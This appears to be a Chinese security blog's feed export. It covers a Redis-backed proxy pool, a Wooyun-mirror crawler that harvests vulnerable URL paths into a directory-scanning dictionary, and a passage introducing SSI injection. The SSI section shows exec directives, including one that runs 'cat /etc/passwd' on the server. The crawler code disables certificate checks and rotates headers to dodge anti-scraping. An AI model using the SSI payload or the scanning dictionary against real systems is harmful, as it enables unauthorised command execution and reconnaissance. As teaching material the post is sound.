else:</div><div class="line">            raise PoolEmptyError</div></pre></td></tr></table></figure>
<p>删除代理IP，代理值减一分，小于最小值则删除</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">def decrease(self, proxy):</div><div class="line">    score = self.db.zscore(REDIS_KEY, proxy)</div><div class="line">    if score and score &gt; MIN_SCORE:</div><div class="line">        print(&apos;代理&apos;, proxy, u&apos;当前分数&apos;, score, u&apos;减1&apos;)</div><div class="line">        return self.db.zincrby(REDIS_KEY, proxy, -1)</div><div class="line">    else:</div><div class="line">        print(&apos;代理&apos;, proxy, u&apos;当前分数&apos;, score, &apos;移除&apos;)</div><div class="line">        return self.db.zrem(REDIS_KEY, proxy)</div></pre></td></tr></table></figure>
<h3 id="检测模块"><a href="#检测模块" class="headerlink" title="检测模块"></a>检测模块</h3><p>代理检测第一次可用，则分数设置为100，代理不可用，分数减1，这样就可以实时改变每个代理的可用情况。API接口返回的时候只需要获取分数高的代理即可。使用的python3的异步IO库<code>aiohttp</code>，参考的大神的表演，学习了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">class Tester(object):</div><div class="line">    def __init__(self):</div><div class="line">        self.redis = RedisClient()</div><div class="line"></div><div class="line">    async def test_single_proxy(self, proxy):</div><div class="line">        &quot;&quot;&quot;</div><div class="line">        异步测试单个代理IP并写入redis</div><div class="line">        &quot;&quot;&quot;</div><div class="line">        conn = aiohttp.TCPConnector(verify_ssl=False)</div><div class="line">        async with aiohttp.ClientSession(connector=conn) as session:</div><div class="line">            try:</div><div class="line">                if isinstance(proxy, bytes):</div><div class="line">                    proxy = proxy.decode(&apos;utf-8&apos;)</div><div class="line">                real_proxy = &apos;http://&apos; + proxy</div><div class="line">                print(&apos;正在测试 &gt;&gt;&gt;&apos;, proxy)</div><div class="line">                async with session.get(TEST_URL, proxy=real_proxy, timeout=15, allow_redirects=False) as response:</div><div class="line">                    if response.status in VALID_STATUS_CODES:</div><div class="line">                        self.redis.max(proxy)</div><div class="line">                        print(&apos;代理可用 &gt;&gt;&gt; &apos;, proxy)</div><div class="line">                    else:</div><div class="line">                        self.redis.decrease(proxy)</div><div class="line">                        print(&apos;请求响应码不合法 &gt;&gt;&gt;&apos;, response.status, &apos;IP&apos;, proxy)</div><div class="line">            except Exception as e:</div><div class="line">                self.redis.decrease(proxy)</div><div class="line">                print(&apos;代理请求失败 &gt;&gt;&gt; &apos;, proxy)</div><div class="line"></div><div class="line">    def run(self):</div><div class="line">        &quot;&quot;&quot;</div><div class="line">        测试主函数</div><div class="line">        &quot;&quot;&quot;</div><div class="line">        print(&apos;*** 测试器开始运行 ***&apos;)</div><div class="line">        try:</div><div class="line">            count = self.redis.count()</div><div class="line">            print(&apos;当前剩余：&apos;, count, u&apos;个代理&apos;)</div><div class="line">            for i in range(0, count, BATCH_TEST_SIZE):</div><div class="line">                start = i</div><div class="line">                stop = min(i + BATCH_TEST_SIZE, count)</div><div class="line">                print(&apos;正在测试第&apos;, start + 1, &apos;-&apos;, stop, u&apos;个代理&apos;)</div><div class="line">                test_proxies = self.redis.batch(start, stop)</div><div class="line">                loop = asyncio.get_event_loop()</div><div class="line">                tasks = [self.test_single_proxy(proxy) for proxy in test_proxies]</div><div class="line">                loop.run_until_complete(asyncio.wait(tasks))</div><div class="line">                sys.stdout.flush()</div><div class="line">                time.sleep(5)</div><div class="line">        except Exception as e:</div><div class="line">            print(&apos;测试器发生错误&apos;, e.args)</div></pre></td></tr></table></figure>
<p>定义了一个类<code>Tester</code>，接下来定义了一个<code>test_single_proxy()</code>方法，并在前面加了<code>async</code>关键词，这代表这个方法是异步的。方法内部首先创建了aiohttp的<code>ClientSession</code>对象，此对象类似于requests的<code>Session</code>对象，可以直接调用该对象的get()方法来访问页面。在这里，代理的设置是通过<code>proxy</code>参数传递给<code>get()</code>方法，程序在获取Response后需要判断响应的状态，如果状态码在<code>VALID_STATUS_CODES</code>列表里，则代表代理可用，可以调用<code>RedisClient</code>的<code>max()</code>方法将代理分数设为100，否则调用<code>decrease()</code>方法将代理分数减1，如果出现异常也同样将代理分数减1。</p>
<h2 id="0x04-接口模块"><a href="#0x04-接口模块" class="headerlink" title="0x04 接口模块"></a>0x04 接口模块</h2><p>使用Flask实现接口模块，前端wget的<a href="http://vulapps.evalbug.com/about/" target="_blank" rel="external">VulApps的前端模版</a>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">__all__ = [&apos;app&apos;]</div><div class="line">app = Flask(__name__)</div><div class="line"></div><div class="line">def get_conn():</div><div class="line">    if not hasattr(g, &apos;redis&apos;):</div><div class="line">        g.redis = RedisClient()</div><div class="line">    return g.redis</div><div class="line"></div><div class="line">@app.route(&apos;/&apos;)</div><div class="line">def index():</div><div class="line">    render = render_template(&apos;index.html&apos;)</div><div class="line">    return make_response(render)</div><div class="line"></div><div class="line">@app.route(&apos;/random&apos;)</div><div class="line">def get_proxy():</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    获取proxyAPI</div><div class="line">    :return: 随机代理</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    conn = get_conn()</div><div class="line">    return conn.random()</div><div class="line"></div><div class="line"></div><div class="line">@app.route(&apos;/count&apos;)</div><div class="line">def get_counts():</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    Get the count of proxies</div><div class="line">    :return: 代理池总量</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    conn = get_conn()</div><div class="line">    return str(conn.count())</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    app.run()</div></pre></td></tr></table></figure>
<p>前端模版<code>index.html</code></p>
<p>项目地址：<a href="http://proxy.w2n1ck.com:9090" target="_blank" rel="external">http://proxy.w2n1ck.com:9090</a>/</p>
<p>API接口：<a href="http://proxy.w2n1ck.com:9090/random" target="_blank" rel="external">http://proxy.w2n1ck.com:9090/random</a></p>
<h3 id="0x05-使用"><a href="#0x05-使用" class="headerlink" title="0x05 使用"></a>0x05 使用</h3><p>测试结果如下：</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/11111.png" alt=""></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/22222.png" alt=""></p>
<p>获取代理IP：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">PROXY_POOL_URL = &apos;http://proxy.w2n1ck.com:9090/random&apos;</div><div class="line">def get_proxy():</div><div class="line">    try:</div><div class="line">        response = requests.get(PROXY_POOL_URL)</div><div class="line">        if response.status_code == 200:</div><div class="line">            return response.text</div><div class="line">    except ConnectionError:</div><div class="line">        return None</div></pre></td></tr></table></figure>
<p>使用代理IP：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">proxy = get_proxy()</div><div class="line">proxies = &#123;</div><div class="line">    &apos;http&apos;: &apos;http://&apos; + proxy,</div><div class="line">    &apos;https&apos;: &apos;https://&apos; + proxy,</div><div class="line">&#125;</div><div class="line">try:</div><div class="line">    response = requests.get(&apos;http://ip.cn/&apos;, proxies=proxies)</div><div class="line">    print(response.text)</div><div class="line">except:</div><div class="line">    pass</div></pre></td></tr></table></figure>
]]></content>
      
        
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> Python </tag>
            
            <tag> 自动化 </tag>
            
            <tag> Redis </tag>
            
            <tag> 代理 </tag>
            
            <tag> Flask </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[伏特漏洞扫描-IoT设备安全解决方案]]></title>
      <url>/2018/04/23/%E4%BC%8F%E7%89%B9%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-IoT%E8%AE%BE%E5%A4%87%E5%AE%89%E5%85%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="# 前言"></a># 前言</h3><p>随着智能硬件的兴起，大量智能家居和可穿戴设备进入了人们的生活，根据Gartner 报告预测，2020年全球IOT物联网设备数量将高达260亿个。但是由于安全标准滞后，以及智能设备制造商缺乏安全意识和投入，物联网已经埋下极大隐患，是个人隐私、企业信息安全甚至国家关键基础设施的头号安全威胁。试想一下，无论家用或企业级的互连设备，如接入互联网的交通指示灯，恒温器，或医用监控设备遭到攻击，后果都将非常可怕。</p>
<p>由于特殊原因，暂时无法查看。。。</p>
<p><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1532082587296&amp;di=3f047ed6df763f4508c85a830fa2e308&amp;imgtype=0&amp;src=http%3A%2F%2Fwx1.sinaimg.cn%2Fthumb150%2Fa7a9fff4ly1fifwd8u8bmg205k05kwh5.gif" alt=""></p>
]]></content>
      
        
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> Python </tag>
            
            <tag> 自动化 </tag>
            
            <tag> Redis </tag>
            
            <tag> 扫描器 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Wooyun漏洞地址url爬虫及数据处理]]></title>
      <url>/2018/03/28/Wooyun%E6%BC%8F%E6%B4%9E%E5%9C%B0%E5%9D%80url%E7%88%AC%E8%99%AB%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86/</url>
      <content type="html"><![CDATA[<p>之前做测试的时候，发现@四爷发现个漏洞，一个非常古怪的地址，我问四爷：“你咋知道这个的？”，四爷说：“扫的啊！”，我：“。。。”，所以才有了这篇文章。<br><a id="more"></a></p>
<p>PS：以上故事纯属扯淡 !  0.0</p>
<p>其实是今年给自己定了个目标，就是好好把编程给学好，毕竟自己安全那么菜，说不定就失业了。。。</p>
<h1 id="0x00-获取Wooyun漏洞地址"><a href="#0x00-获取Wooyun漏洞地址" class="headerlink" title="0x00 获取Wooyun漏洞地址"></a>0x00 获取Wooyun漏洞地址</h1><p>这里选择爬取的目标是<a href="https://wooyun.shuimugan.com/" target="_blank" rel="external">https://wooyun.shuimugan.com</a>，这个镜像站有个好处，就是它的wooyun漏洞地址存入数据库的时候使用了id，即<code>https://wooyun.shuimugan.com/bug/view?bug_no=1</code>这种形式，所以，我们只需要遍历<code>bug_no</code>即可获取所有的漏洞地址（这里考虑到数据下载、处理、文件io等因素，选择了先把存在漏洞的url先存起来）。</p>
<p>感谢网站的站长的不杀之恩！因为，在进行获取地址的时候由于一直再调试并发引擎，所以爬了好多遍。。。</p>
<p>在获取存在漏洞URL的时候只使用了协程，然后主程序使用的进程，数据下载部分使用的进程+协程。</p>
<p>在使用requests请求的时候虽然一直用<code>verif=False</code>来忽略ssl，但是会一直打印：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/Library/Python/2.7/site-packages/requests/packages/urllib3/connectionpool.py:768: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.org/en/latest/security.html</div><div class="line">InsecureRequestWarning)</div></pre></td></tr></table></figure>
<p>搞的很不爽，百度了下使用了下面代码解决：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">import ssl</div><div class="line">try:</div><div class="line">    _create_unverified_https_context = ssl._create_unverified_context  # 忽略证书错误</div><div class="line">except AttributeError:</div><div class="line">    pass</div><div class="line">else:</div><div class="line">    ssl._create_default_https_context = _create_unverified_https_context</div></pre></td></tr></table></figure>
<p>请求的时候使用了通用的反爬虫策略：</p>
<ul>
<li>伪装header头</li>
<li>随机User-Aagent</li>
<li>随机IP</li>
</ul>
<p>这里本来是打算使用自己的代理池的，无奈免费的代理实在是慢，浪费时间，同时可能导致数据不准确。所以就没有使用代理IP了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">headers = &#123;</div><div class="line">&quot;User-Agent&quot;: random.choice(User-Agent),</div><div class="line">&quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,</div><div class="line">&quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;,</div><div class="line">&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,</div><div class="line">&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>协程部分：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">from gevent import monkey, pool</div><div class="line">monkey.patch_all()</div><div class="line">reload(sys)</div><div class="line">sys.setdefaultencoding(&apos;utf8&apos;)</div><div class="line"></div><div class="line">p = pool.Pool(150)</div><div class="line">for i in range(NUM):</div><div class="line">    _url = url + str(i)</div><div class="line">    jobs.append(p.spawn(getURL, _url))</div><div class="line">gevent.joinall(jobs)</div></pre></td></tr></table></figure>
<p>网站<code>bug_no</code>总共有230305个，获取到了8万多个存在漏洞的地址。<br><img src="http://oa8y5guqs.bkt.clouddn.com/wooyun-url.png" alt=""></p>
<h1 id="0x01-下载数据"><a href="#0x01-下载数据" class="headerlink" title="0x01 下载数据"></a>0x01 下载数据</h1><p>下载数据是爬虫的重点，本着<code>只多不少</code>的原则，本来考虑到大的数据量，效率问题，使用正则表达式来进行处理，但是发现获取的脏数据太多，对后面的数据处理造成了很多无法预知的麻烦，所以最终选择的方案是使用<code>xpath+re</code>来进行数据处理。</p>
<p>首先，使用xpath获取漏洞细节部分（有些url在poc字段，但是考虑到大部分，所以只选择了漏洞细节字段，所以爬取的结果不是很准确。）<br><img src="http://oa8y5guqs.bkt.clouddn.com/wooyun-xpath.png" alt=""></p>
<p>xpath：<code>//*[@id=&quot;w0&quot;]/tbody/tr[21]/td/text()</code></p>
<p>这里遇到个问题就是无论怎么复制，都无法获取到漏洞细节里面的内容，使用chrome的xpath helper也的确是能匹配到内容，实在是郁闷！最终在我@加菲猫和@nearg1e斌哥哥的帮助下找到了原因。</p>
<p>原因在于：chrome浏览器在进行页面渲染时使用了htmlparse进行了处理，所以诸如tbody等一些标签是chrome自动加载的。</p>
<p>最终的xpath：<code>//*[@id=&quot;w0&quot;]/tr[21]/td//text()</code></p>
<p>下面就是从漏洞细节中获取所有的URL了，这里还是为了更多的获取URL，找了个非常全面的正则表达式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">r = re.compile(r&apos;(?i)\b((?:[a-z][\w-]+:(?:/&#123;1,3&#125;|[a-z0-9%])|www\d&#123;0,3&#125;[.]|[a-z0-9.\-]+[.][a-z]&#123;2,4&#125;/)(?:[^\s()&lt;&gt;]+|\(([^\s()&lt;&gt;]+|(\([^\s()&lt;&gt;]+\)))*\))+(?:\(([^\s()&lt;&gt;]+|(\([^\s()&lt;&gt;]+\)))*\)|[^\s\`!()\[\]&#123;&#125;;:\&apos;&quot;.,&lt;&gt;?«»“”‘’]))&apos;)</div></pre></td></tr></table></figure>
<p>导致匹配的URL什么奇葩都有，具体可看：<a href="https://github.com/w2n1ck/wooyunDic/blob/master/dicc.txt" target="_blank" rel="external">dicc.txt</a>的内容</p>
<p>在使用这个re的时候又遇到个问题，程序跑着跑着停了，很是无语，后来经帮助调试发现是有些sql注入的URL中存在<code>(,)</code>这两个字符，导致正则死掉，为了图方便，直接做了个判断给剔除了 -。-</p>
<p>并发部分参考如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">def create_process(level, jobqueue, plugins, debug, headers):</div><div class="line">    for _ in range(level):</div><div class="line">        process = multiprocessing.Process(target=worker, args=(jobqueue, plugins, debug, headers))</div><div class="line">        process.daemon = True</div><div class="line">        process.start()</div><div class="line"></div><div class="line">def worker(jobqueue, plugins, debug, headers):</div><div class="line">    while True:</div><div class="line">        try:</div><div class="line">            target = jobqueue.get()</div><div class="line">                gevent_scan_task(target, plugins, debug, headers)</div><div class="line">        except Exception, e:</div><div class="line">            print traceback.format_exc()</div><div class="line">        finally:</div><div class="line">            jobqueue.task_done()</div><div class="line"></div><div class="line">def gevent_scan_task(target, plugins, debug, headers):</div><div class="line">    evt = Event()</div><div class="line">    pool = []</div><div class="line">    scanmodle = ScanModle(target, plugins, debug, headers)</div><div class="line">    pool.append(gevent.spawn(scanmodle.scan_port(evt)))</div><div class="line">    pool.append(gevent.spawn(scanmodle.scan_plugins(evt)))</div><div class="line">    for port in scanmodle.get_ports():</div><div class="line">        pool.append(gevent.spawn(scanmodle.scan_plugins(evt, port)))</div><div class="line">    gevent.joinall(pool)</div><div class="line">    save_cache(scanmodle)</div></pre></td></tr></table></figure></p>
<p>最终获取到了153217个地址<br><img src="http://oa8y5guqs.bkt.clouddn.com/wooyun-1.png" alt=""></p>
<h1 id="0x02-数据处理"><a href="#0x02-数据处理" class="headerlink" title="0x02 数据处理"></a>0x02 数据处理</h1><p>这部分说难也难说不难也不难，我是不太在行【捂脸】，目前我处理的步骤如下：</p>
<ol>
<li>去除所有中文部分（这里由于有些url中的确是带中文，所有使用换行替换）</li>
<li>去除所有只有<code>/</code>，<code>.</code>及<code>len(strip(link) == 0</code>的部分</li>
<li>获取所有URL中的目录部分(使用urlparse)</li>
<li>去除一些其他比如<code>wooyun/bugs</code>，<code>jdbc</code>，<code>**</code>，<code>xmlns</code>，<code>t.cn</code>，<code>ldap</code>，<code>ssh</code>等非预期字符及长度小于等于4的部分</li>
<li>使用urlparse获取<code>p.path</code>, <code>p.query</code>,<code>p.fragment</code>,并使用<code>isinstance</code>来判断两个URL是否相同来去重</li>
</ol>
<p><strong>说明：</strong></p>
<p>1、第三步没有使用迭代，比如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">/wooyun/bugs/?id=1</div><div class="line">没有获取：</div><div class="line">?id=1</div><div class="line">/wooyun</div><div class="line">/wooyun/bugs/</div><div class="line">只是获取到：</div><div class="line">/wooyun/bugs/?id=1</div><div class="line">有兴趣可参考：https://github.com/Xyntax/POC-T/blob/2.0/plugin/urlparser.py</div></pre></td></tr></table></figure>
<p>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">import urlparse</div><div class="line">import sys</div><div class="line">reload(sys)</div><div class="line">sys.setdefaultencoding(&apos;utf-8&apos;)</div><div class="line"></div><div class="line">def iterate_path(ori_str):</div><div class="line"># parser = urlparse.urlparse(ori_str)</div><div class="line"># _path_list = parser.path.replace(&apos;//&apos;, &apos;/&apos;).strip(&apos;/&apos;).split(&apos;/&apos;)</div><div class="line"># print _path_list</div><div class="line">    _ans_list = set()</div><div class="line">    _ans_list.add(ori_str)</div><div class="line">    _ans_list = list(_ans_list)</div><div class="line">    for i in range(len(_ans_list)):</div><div class="line">        p = urlparse.urlparse(_ans_list[i])</div><div class="line">        return urlparse.urlunsplit([&apos;&apos;, &apos;&apos;, p.path, p.query, p.fragment])</div></pre></td></tr></table></figure>
<p>2、第五步是简单去除如下类型的URL：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">/wooyun/?id=1&amp;url=123</div><div class="line">/wooyun/?id=2&amp;url=233</div><div class="line">/wooyun/?id=3&amp;url=666</div><div class="line">和</div><div class="line">/wooyun/1.html</div><div class="line">/wooyun/233.html</div><div class="line">/wooyun/6666.html</div></pre></td></tr></table></figure>
<h1 id="0x03-后续"><a href="#0x03-后续" class="headerlink" title="0x03 后续"></a>0x03 后续</h1><p>其实我主要是想获取个扫描目录的字典，但是如果发散下呢？这些URL有什么用？</p>
<p>我思考的如下：</p>
<p>1、在我刚算入门安全的时候wooyun叽叽了，所以有些漏洞自己基本上没见过，要是在一个一个去看文章，那代价太大了也没有时间。使用这个做目录扫描的时候，如果发现存在此URL，那么说明在wooyun上是存在这个漏洞的，如果自己不知道就可以搜一波，学习下了，快捷、高效。</p>
<p>2、做agent、入侵防御、态势感知的话，可把这些做成漏洞库，遇到访问这些地址就可以来个告警，也可以当个威胁情报搞搞。</p>
<p>3、做个漏洞分析，看看大佬们都喜欢提交啥漏洞（我不会告诉你排在第一二的是svn和git）</p>
<p>获取的数据，处理和没处理的都可以在下面地址下载（PS：处理真的只是简单处理，比如大佬们上传的webshell、一些只针对某个网站的URL筛选等都得做，，，慎用！后续还得优化，大佬们有兴趣的话带带我。 0.0）</p>
<p><strong>未处理：</strong><a href="https://github.com/w2n1ck/wooyunDic/blob/master/dicc.txt" target="_blank" rel="external">dicc.txt</a></p>
<p><strong>已处理：</strong><a href="https://github.com/w2n1ck/wooyunDic/blob/master/dicc8.txt" target="_blank" rel="external">dicc8.txt</a></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wooyun-wooyun.png" alt=""></p>
]]></content>
      
        
        <tags>
            
            <tag> 爬虫 </tag>
            
            <tag> Python </tag>
            
            <tag> 自动化 </tag>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> Wooyun </tag>
            
            <tag> 字典 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SSI-服务器端包含注入]]></title>
      <url>/2018/01/05/SSI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<p>前段时间刚好在一篇文章中看到了一个SSI的文章，现在这种业务基本上很少见了，之前也没了解过(原谅我是菜鸡—_-!)没留意过。运气好，刚好在微博上给遇到了，所以记录下学习过程。<br><a id="more"></a></p>
<h1 id="0x01-关于SSI"><a href="#0x01-关于SSI" class="headerlink" title="0x01 关于SSI"></a>0x01 关于SSI</h1><p>SSI是英文”Server Side Includes”的缩写，翻译成中文就是服务器端包含的意思。SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。</p>
<p>从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。</p>
<h2 id="1-1-启用SSI"><a href="#1-1-启用SSI" class="headerlink" title="1.1 启用SSI"></a>1.1 启用SSI</h2><p><strong>示例：Nginx 配置SSI功能</strong></p>
<p>在http段中加入下面几句即可：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ssi on;</div><div class="line">ssi_silent_errors off;</div><div class="line">ssi_types text/shtml;</div></pre></td></tr></table></figure></p>
<p>默认Apache不开启SSI，SSI这种技术已经比较少用了。如果应用没有使用到SSI，关闭服务器对SSI的支持即可。</p>
<p>IIS和Apache都可以开启SSI功能，具体可参考:<a href="http://m.jb51.net/article/25725.htm" target="_blank" rel="external">http://m.jb51.net/article/25725.htm</a></p>
<h2 id="1-2-SSI语法"><a href="#1-2-SSI语法" class="headerlink" title="1.2 SSI语法"></a>1.2 SSI语法</h2><p>首先，介绍下SHTML，在SHTML文件中使用SSI指令引用其他的html文件（#include），此时服务器会将SHTML中包含的SSI指令解释，再传送给客户端，此时的HTML中就不再有SSI指令了。比如说框架是固定的，但是里面的文章，其他菜单等即可以用#include引用进来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">1、显示服务器端环境变量&lt;#echo&gt;</div><div class="line"></div><div class="line">本文档名称：</div><div class="line">&lt;!–#echo var=&quot;DOCUMENT_NAME&quot;–&gt;</div><div class="line">现在时间：</div><div class="line">&lt;!–#echo var=&quot;DATE_LOCAL&quot;–&gt;</div><div class="line">显示IP地址&lt;/ins&gt;</div><div class="line">&lt;! #echo var=&quot;REMOTE_ADDR&quot;–&gt;</div><div class="line"></div><div class="line">2、将文本内容直接插入到文档中&lt;#include&gt;</div><div class="line"></div><div class="line">&lt;! #include file=&quot;文件名称&quot;–&gt;</div><div class="line">&lt;!--#include virtual=&quot;index.html&quot; --&gt;</div><div class="line">&lt;! #include virtual=&quot;文件名称&quot;–&gt;</div><div class="line">&lt;!--#include virtual=&quot;/www/footer.html&quot; --&gt;</div><div class="line">注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径</div><div class="line"></div><div class="line">3、显示WEB文档相关信息&lt;#flastmod&gt;&lt;#fsize&gt;(如文件制作日期/大小等)</div><div class="line"></div><div class="line">文件最近更新日期：</div><div class="line">&lt;! #flastmod file=&quot;文件名称&quot;–&gt;</div><div class="line">文件的长度：</div><div class="line">&lt;!–#fsize file=&quot;文件名称&quot;–&gt;</div><div class="line"></div><div class="line">4、直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)</div><div class="line"></div><div class="line">&lt;!–#exec cmd=&quot;文件名称&quot;–&gt;</div><div class="line">&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</div><div class="line">&lt;!–#exec cgi=&quot;文件名称&quot;–&gt;</div><div class="line">&lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgi</div><div class="line"></div><div class="line">将某一外部程序的输出插入到页面中。可插入CGI程序或者是常规应用程序的输入，这取决于使用的参数是cmd还是cgi。</div><div class="line"></div><div class="line">5、设置SSI信息显示格式&lt;#config&gt;(如文件制作日期/大小显示方式)</div><div class="line"></div><div class="line">6、高级SSI可设置变量使用if条件语句。</div></pre></td></tr></table></figure></p>
